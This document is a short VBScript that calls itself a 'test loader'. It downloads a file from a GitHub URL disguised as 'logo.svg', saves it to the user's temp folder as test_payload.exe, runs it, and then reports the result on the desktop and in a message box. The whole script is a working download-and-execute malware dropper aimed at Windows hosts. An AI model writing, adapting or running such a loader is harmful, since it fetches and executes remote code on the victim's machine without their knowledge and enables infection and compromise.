' TEST MINIMAL - Execute immediately
Option Explicit
On Error Resume Next

Dim ws, fs, http, stream
Dim url, dest, result

Set ws = CreateObject("WScript.Shell")
Set fs = CreateObject("Scripting.FileSystemObject")

result = "=== TEST LOADER ===" & vbCrLf

' Download
url = "https://raw.githubusercontent.com/sophieduval/der/main/logo.svg"
dest = ws.ExpandEnvironmentStrings("%TEMP%") & "\test_payload.exe"

result = result & "Downloading..." & vbCrLf

Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
http.SetTimeouts 30000, 30000, 30000, 30000
http.Open "GET", url, False
http.Send

result = result & "Status: " & http.Status & vbCrLf
result = result & "Size: " & LenB(http.responseBody) & " bytes" & vbCrLf

If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write http.responseBody
    stream.SaveToFile dest, 2
    stream.Close
    
    result = result & "Saved to: " & dest & vbCrLf
    
    If fs.FileExists(dest) Then
        result = result & "File exists: YES (" & fs.GetFile(dest).Size & " bytes)" & vbCrLf
        result = result & "Executing..." & vbCrLf
        
        ws.Run """" & dest & """", 1, False
        
        result = result & "EXECUTED!" & vbCrLf
    Else
        result = result & "File exists: NO" & vbCrLf
    End If
Else
    result = result & "Download FAILED" & vbCrLf
End If

If Err.Number <> 0 Then
    result = result & "ERROR: " & Err.Description & vbCrLf
End If

' Save result
Dim reportPath
reportPath = ws.ExpandEnvironmentStrings("%USERPROFILE%") & "\Desktop\TEST_RESULT.txt"
Dim ts
Set ts = fs.CreateTextFile(reportPath, True)
ts.Write result
ts.Close

MsgBox result, vbInformation, "Test Result"

Set ws = Nothing
Set fs = Nothing
Set http = Nothing
